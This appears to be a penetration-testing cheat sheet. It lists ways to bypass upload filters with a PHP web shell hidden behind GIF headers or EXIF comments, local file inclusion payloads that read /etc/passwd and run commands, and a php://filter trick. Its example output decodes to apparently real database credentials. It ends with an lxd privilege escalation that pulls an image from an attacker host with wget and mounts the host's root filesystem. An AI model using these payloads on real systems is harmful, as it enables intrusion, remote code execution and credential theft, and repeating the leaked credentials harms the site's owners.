
-------------------------------------------------------------------------------------------------------------
## Bypass File Upload Filtering

`GIF89a`
```
GIF89a;
<?
system($_GET['cmd']);
?>
```

`exiftool`

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```

-------------------------------------------------------------------------------------------------------------
## LFI payloads

*akech.com/index.php?token=`/etc/passwd%00`*

*akrech.com/index.php?page=`../../../../../../etc/passwd`*


## LFI examples

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```
-------------------------------------------------------------------------------------------------------------
## PHP filters for LFI

```
php://filter/convert.base64-encode/resource=
```
*example input:*

akrech/index.php?token=`php://filter/convert.base64-encode/resource=`admin/config

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------------

## lxc/lxd Privilege Escalation

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run those commands on target machine*
```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```
